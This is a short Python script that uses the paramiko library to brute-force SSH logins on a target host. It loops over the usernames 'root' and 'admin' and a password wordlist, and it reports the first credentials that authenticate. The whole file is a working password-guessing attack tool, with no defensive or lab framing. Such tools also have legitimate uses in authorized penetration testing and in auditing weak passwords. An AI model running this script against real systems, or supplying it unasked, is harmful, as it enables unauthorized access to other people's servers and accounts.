import paramiko

def run_brute_force(target, port=22, wordlist_file="default_wordlist.txt"):
    print(f"\n[+] Starting brute-force on {target}:{port}...\n")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Load passwords from wordlist file
    try:
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        return

    usernames = ["root", "admin"]  # You can also make this dynamic

    for user in usernames:
        for pw in passwords:
            try:
                ssh.connect(target, port=port, username=user, password=pw, timeout=1)
                print(f"[+] Found credentials: {user}:{pw}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException as e:
                print(f"[-] SSH error: {e}")
                continue
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                continue

    print("[-] No credentials found")
